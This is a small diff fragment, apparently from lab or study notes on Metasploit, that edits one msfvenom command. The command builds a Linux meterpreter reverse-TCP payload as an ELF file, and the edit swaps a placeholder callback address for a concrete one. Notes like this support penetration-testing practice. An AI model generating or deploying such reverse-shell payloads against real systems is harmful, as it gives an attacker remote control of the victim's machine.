@@ -17,7 +17,7 @@ tree -L 1 auxiliary
 
 `db_nmap`
 
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<10.10.225.241> LPORT=1234 -f elf > rev_shell.elf
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.4.20.232 LPORT=1234 -f elf > rev_shell.elf
 
 
 
